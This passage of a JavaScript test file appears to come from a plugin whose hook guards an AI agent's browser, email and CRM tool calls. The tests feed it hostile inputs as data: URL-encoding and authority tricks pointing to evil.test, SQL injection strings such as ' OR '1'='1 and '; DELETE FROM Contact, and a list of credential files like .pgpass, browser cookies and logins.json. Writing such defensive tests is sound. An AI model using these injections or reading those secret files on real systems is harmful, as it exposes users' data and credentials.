  for (const u of ['https://www.linkedin.com/%6Dessaging/', 'https://www.linkedin.com//messaging/thread/1', 'HTTPS://WWW.LINKEDIN.COM/MESSAGING/', 'https://www.linkedin.com/%252561messaging', 'https://www.linkedin.com/messaging%2Fthread', 'www.linkedin.com/messaging']) {
    if (u.includes('%252561')) continue; // not a messaging path once decoded ("%a" + "messaging")
    assert.match(c('mcp__claude-in-chrome__navigate', u) || '', /LinkedIn messages/, u);
  }
  assert.match(c('mcp__playwright__browser_navigate', 'https://www.linkedin.com/messaging/') || '', /LinkedIn messages/);
  assert.match(c('mcp__pw__browser_navigate', 'https://meetwell.test/e/x/%69nbox') || '', /event app's inbox/);
  assert.equal(readUrl('https://www.LinkedIn.com.//in//ana').host, 'www.linkedin.com');
  assert.match(c('mcp__claude-in-chrome__navigate', 'https://www.linkedin.com%2fin%2fx' + '@www.linkedin.com/messaging/') || '', /LinkedIn messages/, 'the page the browser really opens');
});

// 11. Outbox links only to LinkedIn, known event apps and the event's own site.
test('outbox: a profile link elsewhere shows no link and no "Go"', () => {
  const page = (profile_url) => renderOutbox({ event: { name: 'Expo', list_url: 'https://expo.example/people' }, cards: [{ id: 'c001', touch: 1, kind: 'message', channel: 'paste', name: 'Ana Berg', title: 'COO', company: 'Acme', body: 'Hi', profile_url }], slots: [] });
  assert.doesNotMatch(page('https://evil.test/in/ana'), /evil\.test/);
  assert.doesNotMatch(page('https://evil.test/linkedin.com/in/ana'), /data-url=/);
  assert.match(page('https://www.linkedin.com/in/ana-example'), /data-url="https:\/\/www\.linkedin\.com\/in\/ana-example"/);
  assert.match(page('https://app.brella.io/p/1'), /href="https:\/\/app\.brella\.io\/p\/1"/);
  assert.match(page('https://expo.example/people/ana'), /href="https:\/\/expo\.example\/people\/ana"/);
  assert.equal(profileLinkAllowed('http://www.linkedin.com/in/x'), false, 'https only');
  assert.equal(hostAllowed('https://linkedin.com.evil.test/in/x'), false);
  assert.doesNotMatch(page('https://www.brella.io%2f@evil.test/p'), /href=/, 'an encoded authority shows no link');
  assert.doesNotMatch(page('https://www.linkedin.com%2fin%2fx@evil.test/in/y'), /data-url=/);
});

// 12. Each send is let through once, even with two calls at the same moment.
test('release: two send calls at once, one goes through', async () => {
  const H = setup({ attendees: 'Name,Title,Company,Email\nAna Berg,COO,Acme,ana@acme.test\n', settings: { sending: { channels: ['email'], followups: 'scheduled', linkedin_ack: false } } });
  writeFileSync(join(H.HOME, 'config.json'), JSON.stringify({ connectors: { 'email.send': RECIPE } }));
  triage(H); draftApprove(H);
  const list = cli(H, 'event-outreach', ['send-list', '--event', H.slug]);
  const [it] = JSON.parse(readFileSync(list.file, 'utf8'));
  const input = JSON.stringify({ tool_name: 'mcp__gmail__send_email', tool_input: { to: it.to, subject: it.subject, body: it.body } });
  const run = () => new Promise((res) => { const p = spawn('node', [join(ROOT, 'hooks/guard.mjs')], { env: { ...process.env, FLOORBOSS_HOME: H.HOME, FLOORBOSS_NOW: NOW } }); p.stdin.end(input); p.on('close', res); });
  const codes = await Promise.all([run(), run(), run(), run()]);
  assert.equal(codes.filter((x) => x === 0).length, 1, `exactly one release: ${codes}`);
  const rel = readFileSync(join(H.dir, 'ledger.jsonl'), 'utf8').split('\n').filter((l) => /send_released/.test(l));
  assert.equal(rel.length, 1);
  assert.ok(existsSync(join(H.dir, 'released', `${it.id}-1-0`)));
});

// 13. Folders made before private permissions are tightened.
test('permissions: an existing data folder and its files are made private', () => {
  const H = setup({ attendees: 'Name,Title,Company,Email\nAna Berg,COO,Acme,ana@acme.test\n' });
  chmodSync(H.HOME, 0o755); chmodSync(H.dir, 0o755); chmodSync(join(H.dir, 'event.json'), 0o644);
  cli(H, 'event-context', ['onboarding']);
  assert.equal(statSync(H.HOME).mode & 0o777, 0o700);
  assert.equal(statSync(H.dir).mode & 0o777, 0o700);
  assert.equal(statSync(join(H.dir, 'event.json')).mode & 0o777, 0o600);
});

// 14. More places floorboss never reads.
test('sensitive paths: histories, .pgpass, tokens, browser profiles and credentials files', () => {
  const hh = homedir();
  for (const p of ['.zsh_history', '.bash_history', '.python_history', '.pgpass', '.vault-token', '.cargo/credentials.toml', '.gem/credentials', 'Library/Application Support/Google/Chrome/Default/Cookies', 'Library/Application Support/Firefox/Profiles/x/logins.json', 'Library/Application Support/BraveSoftware/Brave-Browser/Default', '.claude.json', '.docker/config.json', 'certs/server.pem']) {
    assert.throws(() => notSensitive(join(hh, p)), /never reads/, p);
    assert.equal(sensitiveKind(join(hh, p)), 'secret', p);
  }
  assert.equal(sensitiveKind(join(hh, 'Documents', 'attendees.csv')), null);
  // floorboss's own plugin folder, even when installed under ~/.claude/plugins, holds no secrets of the user's.
  assert.doesNotThrow(() => notSensitive(join(ROOT, 'test', 'sims', 'personas', 'ae-email', 'crm.csv')));
});

// 15. Query placeholders can't carry quotes or other query metacharacters.
test('read recipes: a placeholder inside a query can\'t hold quotes, a backslash or a semicolon', () => {
  const config = { connectors: { 'crm.lookup': { server: 'crm', tool: 'query_records', args: { q: "SELECT Id, Email FROM Contact WHERE Email = '{email}'" } } } };
  const c = (q) => check({ tool_name: 'mcp__crm__query_records', tool_input: { q } }, { config });
  assert.equal(c("SELECT Id, Email FROM Contact WHERE Email = 'ana@acme.test'"), null);
  for (const v of ["x' OR '1'='1", 'x\\\' OR 1=1', "x'; DELETE FROM Contact", 'x" OR "1"="1', 'a`b']) assert.match(c(`SELECT Id, Email FROM Contact WHERE Email = '${v}'`) || '', /must be as in the recipe/, v);
  // Outside quotes: a plain value only, and no query words in a query.
  const u = (t, v) => check({ tool_name: 'mcp__crm__query_records', tool_input: { q: v } }, { config: { connectors: { 'crm.lookup': { server: 'crm', tool: 'query_records', args: { q: t } } } } });
  assert.match(u('id eq {crm_id}', 'id eq 1 or 1 eq 1') || '', /must be as in the recipe/);
  assert.match(u('id eq {crm_id}', 'id eq (1)') || '', /must be as in the recipe/);
  assert.equal(u('id eq {crm_id}', 'id eq 0031x00001'), null);
  assert.equal(u('{name} {company}', 'Ana Berg Smith and Sons'), null, 'a plain search keeps its words');
});
